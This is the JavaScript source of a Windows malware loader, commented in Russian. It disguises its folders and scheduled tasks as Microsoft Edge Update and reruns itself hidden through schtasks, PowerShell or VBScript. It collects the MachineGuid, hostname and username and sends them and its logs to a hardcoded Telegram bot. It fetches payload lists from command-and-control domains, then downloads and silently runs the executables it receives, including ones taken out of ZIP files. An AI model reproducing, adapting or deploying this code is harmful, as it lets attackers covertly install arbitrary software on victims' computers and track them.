﻿﻿// launcher.js — фон (SCHTASKS→PS→VBS), lock, retry 0B, свободные имена,
// резервные эндпоинты и ЛОГИ В TELEGRAM вместо файла
//
// + ZIP-ПОДДЕРЖКА: скачивание .zip → распаковка → поиск .exe → запуск

const fs = require('fs');
const path = require('path');
const os = require('os');
const url = require('url');
const http = require('http');
const https = require('https');
const crypto = require('crypto');
const { spawn, spawnSync } = require('child_process');

// === НАСТРОЙКИ ===============================================================

// Эндпоинты обновлений: основной + резервные
const UPDATE_ENDPOINTS = [
  'https://ai-friends.cc/update_request.php',
  'https://anubis.locker/update_request.php',
  'https://hydra-load.space/update_request.php',
];
let ACTIVE_ENDPOINT = null;

const MAX_REDIRECTS = 5;
const MAX_BYTES = 1024 * 1024 * 1024;
const ALLOWED_HOSTS = []; // например: ['happymoddl.org','reserv1.com','reserv2.com']
const INSTALL_TIMEOUT_MS = 60_000;
const START_GRACE_MS = 2_000;
const MAX_ITEMS_FROM_TEXT = 20;

// Для распаковки ZIP
const UNZIP_TIMEOUT_MS = 90_000;
const MAX_ZIP_SCAN_FILES = 5000;
const MAX_ZIP_SCAN_DEPTH = 8;

const DEFAULT_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123 Safari/537.36';
const ENDPOINT_HEADERS = { Accept: 'application/json, text/plain;q=0.9, */*;q=0.1', 'User-Agent': DEFAULT_UA };
const FILE_HEADERS = (referer) => ({ 'User-Agent': DEFAULT_UA, Referer: referer ?? '' });

// Telegram-логирование
const TG_ENABLED  = true;                   // включить отправку логов в Telegram
const TG_BOT_TOKEN = '8662428219:AAGFpTHQdvOveioJn1alBmctKjGROWQ1J2U';   // << ПОДСТАВЬТЕ ВАШ ТОКЕН
const TG_CHAT_ID   = '-1004307798823';      // << ПОДСТАВЬТЕ ВАШ CHAT_ID (можно приватный канал)
const TG_FLUSH_MS  = 1500;                  // как часто слать буфер (мс)
const TG_MAX_CHARS = 3500;                  // запас к лимиту ~4096 символов

// Папка для служебных файлов (лок/флаг/временный VBS)
const targetDir = path.join(os.homedir(), 'AppData', 'Local', 'MicrosoftEdgeUpdate');
if (!fs.existsSync(targetDir)) fs.mkdirSync(targetDir, { recursive: true });

const READY_FLAG    = path.join(targetDir, 'ready.flag');
const LOCK_FILE     = path.join(targetDir, 'launcher.lock');
const TASK_NAME_FILE = path.join(targetDir, 'taskname.txt'); // тут будем хранить имя задачи

// Режимы
const isDebug   = process.argv.some(a => a === '--debug' || a === '-d') ||
                  String(process.env.LAUNCHER_DEBUG || '').toLowerCase() === '1';
const isBgChild = process.argv.includes('--bg');

// Имя задачи, которую должен удалить текущий фоновый процесс
let scheduledTaskName = null;

// === ЛОГИ В TELEGRAM =========================================================

// Префикс логов (кто/где запускает)
function whoamiPrefix() {
  const user = process.env.USERNAME || process.env.USER || 'user';
  const host = os.hostname();
  return `[${host}\\${user}]`;
}

// Буфер сообщений (строк)
let LOG_BUF = [];
let TG_TIMER = null;

function ts() {
  return new Date().toISOString().replace('T',' ').replace('Z','');
}

// Публичная функция логирования (как раньше log(), но теперь в Telegram)
function log(line) {
  try {
    const prefix = whoamiPrefix();
    LOG_BUF.push(`[${ts()}] ${line}`);
    if (LOG_BUF.join('\n').length >= TG_MAX_CHARS) {
      tgFlush(); // слишком много — шлём сразу
    } else {
      scheduleFlush();
    }
    if (isDebug) process.stderr.write(`${prefix} ${line}\n`);
  } catch {}
}

function scheduleFlush() {
  if (!TG_ENABLED) return;
  if (TG_TIMER) return;
  TG_TIMER = setTimeout(() => {
    TG_TIMER = null;
    tgFlush();
  }, TG_FLUSH_MS);
}

function tgFlush() {
  if (!TG_ENABLED) { LOG_BUF = []; return; }
  if (!TG_BOT_TOKEN || !TG_CHAT_ID) { LOG_BUF = []; return; }
  if (LOG_BUF.length === 0) return;

  const chunks = [];
  let current = '';
  for (const line of LOG_BUF) {
    if ((current + (current ? '\n' : '') + line).length > TG_MAX_CHARS) {
      if (current) chunks.push(current);
      current = line;
    } else {
      current += (current ? '\n' : '') + line;
    }
  }
  if (current) chunks.push(current);
  LOG_BUF = [];

  for (const text of chunks) {
    tgSend(text).catch(() => {/* игнор ошибок TG */});
  }
}

// Отправка одного сообщения в Telegram (без внешних зависимостей)
function tgSend(text) {
  return new Promise((resolve) => {
    try {
      const payload = new URLSearchParams({
        chat_id: TG_CHAT_ID,
        text,
        disable_web_page_preview: 'true',
      }).toString();

      const options = {
        method: 'POST',
        hostname: 'api.telegram.org',
        path: `/bot${TG_BOT_TOKEN}/sendMessage`,
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(payload),
        },
        timeout: 4000,
      };

      const req = https.request(options, (res) => {
        res.on('data', ()=>{});
        res.on('end', resolve);
      });
      req.on('error', resolve);
      req.write(payload);
      req.end();
    } catch {
      resolve();
    }
  });
}

// Перед выходом стараемся дослать всё накопленное
function gracefulFlushAndExit(code = 0) {
  try { if (TG_TIMER) clearTimeout(TG_TIMER); } catch {}
  const pending = LOG_BUF.length;
  if (!pending) process.exit(code);
  tgFlush();
  setTimeout(() => process.exit(code), 800);
}

// Удаление задачи планировщика по имени (только наши MicrosoftEdgeUpdate_*)
function deleteScheduledTask(name) {
  if (!name || typeof name !== 'string') return;
  if (process.platform !== 'win32') return;
  if (!/^MicrosoftEdgeUpdate_/.test(name)) return; // защита от случайного удаления чужих задач

  try {
    spawnSync('schtasks.exe', ['/Delete', '/TN', name, '/F'], {
      windowsHide: true,
      stdio: 'ignore',
      timeout: 5000,
    });
    log(`Scheduled task deleted: ${name}`);
  } catch (e) {
    try {
      log('WARN: schtasks delete failed for ' + name + ': ' + (e && e.message ? e.message : String(e)));
    } catch {}
  }
}

// Общий выход: сначала удаляем задачу (если мы фон), потом телеграм-флаш + exit
function exitWithCleanup(code = 0) {
  try {
    if (isBgChild && scheduledTaskName) {
      deleteScheduledTask(scheduledTaskName);
    }
  } catch {}
  gracefulFlushAndExit(code);
}

// === LOCK-ФАЙЛ ===============================================================

function isStaleLock(file, maxAgeMs = 20 * 60 * 1000) {
  try {
    const st = fs.statSync(file);
    return (Date.now() - st.mtimeMs) > maxAgeMs;
  } catch { return false; }
}

function acquireLockOrExit() {
  if (fs.existsSync(LOCK_FILE) && isStaleLock(LOCK_FILE)) {
    try { fs.unlinkSync(LOCK_FILE); } catch {}
  }
  try {
    fs.writeFileSync(LOCK_FILE, String(process.pid), { flag: 'wx' });
  } catch (e) {
    if (e && e.code === 'EEXIST') {
      log('Lock существует — другой экземпляр уже работает. Выход.');
      exitWithCleanup(0);
    }
    throw e;
  }
  const release = () => { try { fs.unlinkSync(LOCK_FILE); } catch {} };
  process.on('exit', release);
  process.on('SIGINT', () => { release(); exitWithCleanup(0); });
  process.on('SIGTERM',() => { release(); exitWithCleanup(0); });
  return release;
}

// === ВСПОМОГАТЕЛЬНЫЕ ДЛЯ ФОНА ===============================================

function waitForReadyFlag(msTotal = 5000, step = 50) {
  const start = Date.now();
  while (Date.now() - start < msTotal) {
    if (fs.existsSync(READY_FLAG)) return true;
    Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, step);
  }
  return false;
}
function timePlusRoundedMinute(offsetMinutes = 1) {
  const now = new Date();
  const t = Math.ceil((now.getTime() + 1000) / 60000) * 60000 + (offsetMinutes - 1) * 60000;
  const d = new Date(t);
  const hh = String(d.getHours()).padStart(2,'0');
  const mm = String(d.getMinutes()).padStart(2,'0');
  return `${hh}:${mm}`;
}

// === ФОНОВЫЙ СТАРТ (SCHTASKS ⇒ немедленный EXIT; PS/VBS — резерв) ===========

(function maybeGoBackground() {
  if (process.platform !== 'win32') return;
  if (isDebug || isBgChild) return;

  try { fs.unlinkSync(READY_FLAG); } catch {}

  const exePath   = process.execPath;
  const childArgs = '--bg';

  // 1) SCHTASKS
  try {
    const vbsPath = path.join(targetDir, 'run-launcher.vbs');
    const vbsBody = `CreateObject("Wscript.Shell").Run """" & "${exePath}" & """" & " ${childArgs}", 0, False`;
    fs.writeFileSync(vbsPath, Buffer.from('\uFEFF' + vbsBody, 'utf16le'));

    const taskName = `MicrosoftEdgeUpdate_${Date.now()}_${Math.floor(Math.random()*1000)}`;
    const st = timePlusRoundedMinute(1);
    const createArgs = [
      '/Create','/SC','ONCE','/ST', st,
      '/TN', taskName,
      '/TR', `"wscript.exe" "${vbsPath}"`,
      '/F'
    ];
    const cr = spawnSync('schtasks.exe', createArgs, { windowsHide: true, stdio: 'ignore', timeout: 8000 });
    if (cr && cr.status === 0) {
      // сохраняем имя созданной задачи для фонового процесса
      try { fs.writeFileSync(TASK_NAME_FILE, taskName, 'utf8'); } catch {}
      log(`SCHTASKS created (${taskName}) на ${st}. Родитель выходит сразу.`);
      return exitWithCleanup(0);
    } else {
      log('WARN: SCHTASKS create failed');
    }
  } catch (e) {
    log('WARN: SCHTASKS error: ' + (e && e.message ? e.message : String(e)));
  }

  // 2) PowerShell — скрытый ребёнок
  try {
    const exePS = exePath.replace(/'/g, "''");
    const psCmd = `Start-Process -FilePath '${exePS}' -ArgumentList '${childArgs}' -WindowStyle Hidden`;
    const ps = spawnSync('powershell.exe', ['-NoProfile','-WindowStyle','Hidden','-Command', psCmd],
                         { windowsHide: true, stdio: 'ignore', timeout: 5000 });
    if (ps && ps.status === 0) {
      if (waitForReadyFlag(4000)) { log('Hidden child via PowerShell OK'); return exitWithCleanup(0); }
      log('WARN: PS started but no ready.flag, continue visible');
    } else {
      log('WARN: PowerShell blocked/unavailable');
    }
  } catch (e) {
    log('WARN: PowerShell error: ' + (e && e.message ? e.message : String(e)));
  }

  // 3) VBS — фолбэк
  try {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'ml-'));
    const vbsPath = path.join(tempDir, 'run.vbs');
    const vbs = `CreateObject("Wscript.Shell").Run """" & "${exePath}" & """" & " ${childArgs}", 0, False`;
    fs.writeFileSync(vbsPath, Buffer.from('\uFEFF' + vbs, 'utf16le'));
    const child = spawn('wscript.exe', [vbsPath], { windowsHide: true, stdio: 'ignore', detached: true });
    try { child.unref(); } catch {}
    if (waitForReadyFlag(4000)) { log('Hidden child via VBS OK'); return exitWithCleanup(0); }
    log('WARN: VBS started but no ready.flag');
  } catch (e) {
    log('WARN: VBS error: ' + (e && e.message ? e.message : String(e)));
  }

  log('Fallback to visible mode (user can close console).');
})();

// Если мы «скрытый ребёнок» — подтверждаем готовность и читаем имя задачи
if (isBgChild) {
  try { fs.writeFileSync(READY_FLAG, String(Date.now())); } catch {}
  try {
    const tn = fs.readFileSync(TASK_NAME_FILE, 'utf8').trim();
    if (tn) scheduledTaskName = tn;
  } catch {}
}
const releaseLock = acquireLockOrExit();

// === Machine GUID (Windows) ===============================================

function getMachineGuidSync() {
  if (process.platform !== 'win32') return '';
  try {
    const r = spawnSync('reg', [
      'query',
      'HKLM\\SOFTWARE\\Microsoft\\Cryptography',
      '/v',
      'MachineGuid'
    ], { encoding: 'utf8', windowsHide: true, stdio: ['ignore','pipe','pipe'] });
    if (r.status !== 0 || !r.stdout) return '';
    const m = r.stdout.match(/MachineGuid\s+REG_SZ\s+([^\r\n]+)/i);
    return m ? m[1].trim() : '';
  } catch (e) {
    log('MachineGuid error: ' + (e && e.message ? e.message : String(e)));
    return '';
  }
}

const MACHINE_GUID = getMachineGuidSync();
if (MACHINE_GUID) {
  log('MachineGuid: ' + MACHINE_GUID);
} else {
  log('MachineGuid не получен или не Windows.');
}

function appendGuidParam(endpointUrl) {
  if (!MACHINE_GUID) return endpointUrl;
  try {
    const u = new url.URL(endpointUrl);
    u.searchParams.set('guid', MACHINE_GUID);
    return u.toString();
  } catch {
    return endpointUrl;
  }
}

// === HTTP ===================================================================

function fetchWithHeaders(urlStr, headers, redirects = 0) {
  return new Promise((resolve, reject) => {
    const u = new url.URL(urlStr);
    const client = u.protocol === 'https:' ? https : http;
    const req = client.get(
      { protocol: u.protocol, hostname: u.hostname, port: u.port, path: u.pathname + (u.search || ''), timeout: 20_000, headers },
      (res) => {
        if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
          if (redirects >= MAX_REDIRECTS) { res.resume(); return reject(new Error('Слишком много редиректов')); }
          const nextUrl = new url.URL(res.headers.location, urlStr).toString();
          res.resume(); return resolve(fetchWithHeaders(nextUrl, headers, redirects + 1));
        }
        if (res.statusCode !== 200) { res.resume(); return reject(new Error(`HTTP ${res.statusCode} для ${urlStr}`)); }
        resolve(res);
      }
    );
    req.on('error', reject);
  });
}
function stripBOMorWhitespace(s) { if (!s) return s; let t = s.replace(/^\uFEFF/, ''); return t.trim(); }

// === Список обновлений + выбор эндпоинта =====================================

async function getUpdateListFrom(endpointUrl) {
  const endpoint = new url.URL(endpointUrl);
  const res = await fetchWithHeaders(endpointUrl, ENDPOINT_HEADERS);
  const contentType = (res.headers['content-type'] || '').toLowerCase();
  const chunks = []; for await (const c of res) chunks.push(c);
  const bodyStr = stripBOMorWhitespace(Buffer.concat(chunks).toString('utf8'));

  // Специальный случай: сервер вернул явный отказ по лицензии
  const trimmed = bodyStr.trim().toLowerCase();
  if (trimmed === 'false' || trimmed === '0') {
    const err = new Error('License denied by update_request.php (guid/ip not found)');
    err.code = 'LICENSE_DENIED';
    throw err;
  }

  if (contentType.includes('text/html') || /^<!doctype\s+html/i.test(bodyStr)) {
    throw new Error('update.php вернул HTML (логин/редирект). Нужен JSON или text/plain.');
  }

  try {
    const parsed = JSON.parse(bodyStr);
    if (Array.isArray(parsed)) return parsed.map((x) => normalizeItem(x, endpoint));
    if (parsed && typeof parsed === 'object' && parsed.url) return [normalizeItem(parsed, endpoint)];
  } catch { /* fallback: text/plain */ }

  const lines = bodyStr.split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
  const urlLines = lines.filter((s) => /^https?:\/\//i.test(s));
  if (!urlLines.length) throw new Error('Ответ update.php не содержит URL.');
  const selection = urlLines.slice(0, MAX_ITEMS_FROM_TEXT);
  return selection.map((u) => normalizeItem({ url: u }, endpoint));
}

async function resolveEndpoint() {
  const errors = [];
  for (const ep of UPDATE_ENDPOINTS) {
    const epWithGuid = appendGuidParam(ep);
    try {
      const items = await getUpdateListFrom(epWithGuid);
      ACTIVE_ENDPOINT = epWithGuid;
      log(`Использую эндпоинт: ${epWithGuid}`);
      return items;
    } catch (e) {
      if (e && e.code === 'LICENSE_DENIED') {
        log(`Лицензия не подтверждена на эндпоинте: ${epWithGuid}. Установка компонентов отменена.`);
        throw e; // не пробуем другие эндпоинты
      }
      errors.push(`${epWithGuid} => ${e.message}`);
      log(`ENDPOINT FAIL: ${epWithGuid} => ${e.message}`);
    }
  }
  throw new Error('Все эндпоинты недоступны: ' + errors.join(' | '));
}

function normalizeItem(obj, endpoint) {
  const u = new url.URL(obj.url, endpoint);
  if (!['https:','http:'].includes(u.protocol)) throw new Error(`Недопустимый протокол в URL: ${u.protocol}`);
  if (ALLOWED_HOSTS.length > 0) {
    const ok = ALLOWED_HOSTS.map((h) => h.toLowerCase()).includes(u.hostname.toLowerCase());
    if (!ok) throw new Error(`Хост не в allowlist: ${u.hostname}`);
  }
  let args = typeof obj.args === 'string' ? obj.args : '';
  let wait = typeof obj.wait === 'boolean' ? obj.wait : 'auto';
  // Эвристика для Sysinternals
  if (u.hostname.toLowerCase().includes('live.sysinternals.com')) {
    if (!args) args = '-accepteula';
    if (wait === 'auto') wait = false;
  }
  return {
    url: u.toString(),
    sha256: typeof obj.sha256 === 'string' ? obj.sha256.toLowerCase() : null,
    args,
    run: typeof obj.run === 'boolean' ? obj.run : true,
    wait,
    timeout: Number.isFinite(obj.timeout) ? obj.timeout : INSTALL_TIMEOUT_MS,
  };
}

// === Скачивание/проверки =====================================================

async function getWritablePath(basePath) {
  const { dir, name, ext } = path.parse(basePath);
  let candidate = basePath;
  for (let i = 0; i < 50; i++) {
    try { const fd = fs.openSync(candidate, 'wx'); fs.closeSync(fd); fs.unlinkSync(candidate); return candidate; }
    catch (e) {
      if (e && (e.code === 'EEXIST' || e.code === 'EBUSY' || e.code === 'EPERM')) {
        candidate = path.join(dir, `${name} (${i + 2})${ext}`); continue;
      }
      throw e;
    }
  }
  return path.join(dir, `${name}_${Date.now()}${ext}`);
}

async function downloadWithHash(fileUrl, destBasePath) {
  const origin = ACTIVE_ENDPOINT ? new url.URL(ACTIVE_ENDPOINT).origin : '';
  const tries = [ FILE_HEADERS(origin), FILE_HEADERS('') ];
  let lastErr = null;

  for (let attempt = 0; attempt < tries.length; attempt++) {
    try {
      const destPath = await getWritablePath(destBasePath);
      const res = await fetchWithHeaders(fileUrl, tries[attempt]);
      const cl = res.headers['content-length'];
      if (cl === '0') log(`WARN: Content-Length: 0 (попытка ${attempt+1}) — читаю поток`);

      const fileStream = fs.createWriteStream(destPath);
      const hash = crypto.createHash('sha256');
      let downloaded = 0;

      await new Promise((resolve, reject) => {
        res.on('data', (chunk) => {
          downloaded += chunk.length;
          if (downloaded > MAX_BYTES) { res.destroy(new Error('Размер файла превысил лимит')); return; }
          hash.update(chunk);
        });
        res.pipe(fileStream);
        res.on('error', reject);
        fileStream.on('finish', resolve);
        fileStream.on('error', reject);
      });

      if (downloaded === 0) { try { fs.unlinkSync(destPath); } catch {} throw new Error('Получено 0 байт'); }

      const digest = hash.digest('hex');
      return { sha256: digest, bytes: downloaded, path: destPath };
    } catch (e) {
      lastErr = e;
      log(`WARN: попытка ${attempt+1} для ${fileUrl} не удалась: ${e.message}`);
    }
  }
  throw lastErr || new Error('Скачивание не удалось');
}

function isPEExecutable(filePath) {
  try {
    const fd = fs.openSync(filePath, 'r');
    const buf = Buffer.alloc(2);
    fs.readSync(fd, buf, 0, 2, 0);
    fs.closeSync(fd);
    return buf[0] === 0x4d && buf[1] === 0x5a; // 'MZ'
  } catch { return false; }
}

// ZIP-маркер
function isZipArchive(filePath) {
  try {
    const fd = fs.openSync(filePath, 'r');
    const buf = Buffer.alloc(4);
    fs.readSync(fd, buf, 0, 4, 0);
    fs.closeSync(fd);
    // PK\x03\x04 или (редко) PK\x05\x06 (пустой архив)
    return buf[0] === 0x50 && buf[1] === 0x4b && ( (buf[2] === 0x03 && buf[3] === 0x04) || (buf[2] === 0x05 && buf[3] === 0x06) );
  } catch { return false; }
}

// Распаковка ZIP: сначала PowerShell Expand-Archive, затем tar -xf (фолбэк)
function extractZip(zipPath) {
  const destDir = fs.mkdtempSync(path.join(targetDir, 'unz-'));
  const q = (p) => p.replace(/'/g, "''");
  let ok = false;

  try {
    const cmd = `Expand-Archive -LiteralPath '${q(zipPath)}' -DestinationPath '${q(destDir)}' -Force`;
    const r = spawnSync('powershell.exe', ['-NoProfile','-Command', cmd],
                        { windowsHide: true, stdio: 'ignore', timeout: UNZIP_TIMEOUT_MS });
    if (r && r.status === 0) ok = true;
    else log('WARN: Expand-Archive failed (status != 0)');
  } catch (e) {
    log('WARN: PowerShell unzip error: ' + (e && e.message ? e.message : String(e)));
  }

  if (!ok) {
    try {
      const r2 = spawnSync('tar', ['-xf', zipPath, '-C', destDir],
                           { windowsHide: true, stdio: 'ignore', timeout: UNZIP_TIMEOUT_MS });
      if (r2 && r2.status === 0) ok = true;
      else log('WARN: tar -xf failed (status != 0)');
    } catch (e) {
      log('WARN: tar unzip error: ' + (e && e.message ? e.message : String(e)));
    }
  }

  if (!ok) {
    try { fs.rmSync(destDir, { recursive: true, force: true }); } catch {}
    throw new Error('Не удалось распаковать ZIP архив');
  }

  return destDir;
}

function listFilesRecursive(root, { maxDepth = MAX_ZIP_SCAN_DEPTH, maxFiles = MAX_ZIP_SCAN_FILES } = {}) {
  const out = [];
  let count = 0;

  function walk(dir, depth) {
    if (depth < 0 || count >= maxFiles) return;
    let entries = [];
    try { entries = fs.readdirSync(dir, { withFileTypes: true }); } catch { return; }
    for (const ent of entries) {
      if (count >= maxFiles) break;
      const p = path.join(dir, ent.name);
      if (ent.isDirectory()) {
        walk(p, depth - 1);
      } else if (ent.isFile()) {
        out.push(p);
        count++;
      }
    }
  }
  walk(root, maxDepth);
  return out;
}

function pickInstallerExecutable(filePaths) {
  const exes = filePaths.filter((p) => p.toLowerCase().endsWith('.exe'));
  if (exes.length === 0) return null;

  // Приоритет по имени
  const priorities = ['setup', 'install', 'installer', 'update', 'updater', 'client', 'driver'];
  const scored = exes.map((p) => {
    const base = path.basename(p).toLowerCase();
    let score = 0;
    for (let i = 0; i < priorities.length; i++) {
      if (base.includes(priorities[i])) score += (priorities.length - i) * 10;
    }
    // размер как дополнительный критерий
    let size = 0;
    try { size = fs.statSync(p).size; } catch {}
    return { p, score, size };
  });

  scored.sort((a, b) => {
    if (b.score !== a.score) return b.score - a.score;
    return b.size - a.size;
  });

  return scored[0].p;
}

function deleteDirLater(dir, ms = 15_000) {
  setTimeout(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} }, ms);
}

// === Запуск ================================================================

function parseArgs(argsStr) { return argsStr ? (argsStr.match(/(?:[^\s"]+|"[^"]*")+/g) || []).map(s => s.replace(/^"(.*)"$/, '$1')) : []; }
function isSilentArgs(argsStr) { const s = (argsStr || '').toLowerCase(); return s.includes('/s')||s.includes('/silent')||s.includes('/verysilent')||s.includes('/qn'); }

function runInstaller(exePath, argsStr = '', waitMode = 'auto', timeoutMs = INSTALL_TIMEOUT_MS) {
  return new Promise((resolve, reject) => {
    const argv = parseArgs(argsStr);
    const shouldWait = waitMode === true || (waitMode === 'auto' && isSilentArgs(argsStr));
    const child = spawn(exePath, argv, { windowsHide: true, stdio: 'ignore', detached: !shouldWait });
    child.on('error', reject);
    if (!shouldWait) { setTimeout(() => { try { child.unref(); } catch {} resolve(); }, START_GRACE_MS); return; }
    let done = false;
    const onDone = (err) => { if (done) return; done = true; clearTimeout(timer); err ? reject(err) : resolve(); };
    const timer = setTimeout(() => onDone(null), Math.max(1000, timeoutMs));
    child.on('exit', () => onDone(null));
  });
}

// === Основной поток ==========================================================

(async () => {
  try {
    log('Старт. Кандидаты эндпоинтов: ' + UPDATE_ENDPOINTS.join(', '));

    const items = await resolveEndpoint();
    log(`Активный эндпоинт: ${ACTIVE_ENDPOINT}`);
    log('Получено элементов: ' + items.length);

    for (let idx = 0; idx < items.length; idx++) {
      const it = items[idx];
      log(`[${idx + 1}/${items.length}] ${it.url}`);
      try {
        const { pathname } = new url.URL(it.url);
        const srcName = path.basename(pathname) || `update_${idx + 1}`;
        const basePath  = path.join(targetDir, srcName);

        const { sha256: actualHash, bytes, path: savedPath } = await downloadWithHash(it.url, basePath);
        log(`Скачано ${bytes} байт; SHA-256: ${actualHash}${savedPath!==basePath ? ' (имя изменено из-за занятости файла)' : ''}`);
        if (it.sha256 && actualHash !== it.sha256) throw new Error('Контрольная сумма не совпала');

        if (it.run === false) { log('Запуск пропущен (run=false).'); continue; }

        const waitMode = it.wait;
        const timeoutMs = it.timeout || INSTALL_TIMEOUT_MS;

        // === ВЕТКА: EXE или ZIP ===
        if (isPEExecutable(savedPath)) {
          // Обычный .exe — как раньше
          log(`Файл выглядит как .exe (MZ).`);
          log(`Запуск: file="${path.basename(savedPath)}", args="${it.args||''}", wait=${waitMode}, timeout=${timeoutMs}`);
          await runInstaller(savedPath, it.args || '', waitMode, timeoutMs);
          if (waitMode === false) {
            setTimeout(() => { try { fs.unlinkSync(savedPath); } catch {} }, 10_000);
          }
          log('Готово.');
        } else if (isZipArchive(savedPath)) {
          // ZIP-архив — распаковываем и ищем .exe
          log('Обнаружен ZIP архив. Распаковка…');
          const extractDir = extractZip(savedPath);
          log(`Распаковано в: ${extractDir}`);

          const files = listFilesRecursive(extractDir);
          log(`Найдено файлов в архиве: ${files.length}`);

          const exePath = pickInstallerExecutable(files);
          if (!exePath) throw new Error('В ZIP не найден ни один .exe');

          if (!isPEExecutable(exePath)) throw new Error('Выбранный файл из ZIP не похож на .exe (нет MZ)');

          log(`Выбран инсталлятор: ${path.relative(extractDir, exePath)}`);
          log(`Запуск: file="${path.basename(exePath)}", args="${it.args||''}", wait=${waitMode}, timeout=${timeoutMs}`);
          await runInstaller(exePath, it.args || '', waitMode, timeoutMs);

          if (waitMode === false) {
            // Чистим распакованное чуть позже
            deleteDirLater(extractDir, 15_000);
          }
          log('Готово (ZIP).');
        } else {
          throw new Error('Файл не .exe и не .zip (отсутствует сигнатура MZ/PK).');
        }
      } catch (e) {
        log('ERROR: ' + e.message);
      }
    }

    log('Итог: завершено.');
    exitWithCleanup(0);
  } catch (e) {
    if (e && e.code === 'LICENSE_DENIED') {
      log('Лицензия не подтверждена. Компоненты не будут установлены.');
      exitWithCleanup(0);
      return;
    }
    log('CRIT: ' + e.message);
    exitWithCleanup(1);
  }
})();
